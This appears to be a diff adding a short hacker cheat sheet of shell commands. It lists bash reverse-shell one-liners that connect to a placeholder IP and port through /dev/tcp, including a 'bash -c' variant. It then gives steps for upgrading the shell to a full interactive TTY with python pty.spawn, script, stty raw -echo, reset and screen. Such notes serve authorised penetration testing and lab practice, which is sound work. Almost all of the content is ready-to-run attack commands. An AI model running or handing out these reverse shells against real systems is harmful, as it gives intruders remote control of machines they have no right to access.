@@ -1,0 +1,33 @@
+Basic Information
+
+Command transferred:
+________________________________________________________________________________________________
+## Establishing a reverse shell
+bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
+________________________________________________________________________________________________
+## Use 'bash -c' when an environment requires explicit invocation of a new Bash shell to ensure proper execution.
+bash -c 'bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1'
+________________________________________________________________________________________________
+
+# Upgrading to a TTY Shell
+________________________________________________________________________________________________
+| plat@rgb: python -c 'import pty; pty.spawn("/bin/bash")'
+| ## May require tweaking for python version.
+________________________________________________________________________________________________
+| plat@rgb: script /dev/null -c /bin/bash
+| ## Starts a new TTY session and launches Bash within it.
+| 
+| plat@rgb: Ctrl-Z
+| ## Suspends the current TTY shell process and places it in the background.
+| 
+| plat@rgb: stty raw -echo; fg
+| ## Switches the terminal to raw mode (directly passes input/output) and disables echoing, 
+| ## then brings the suspended process back to the foreground.
+| 
+| plat@rgb: reset
+| ## Resets the terminal settings to clean and usable defaults.
+| 
+| plat@rgb: screen
+| ## Starts a screen session to enhance terminal handling and functionality.
+|________________________________________________________________________________________________
+
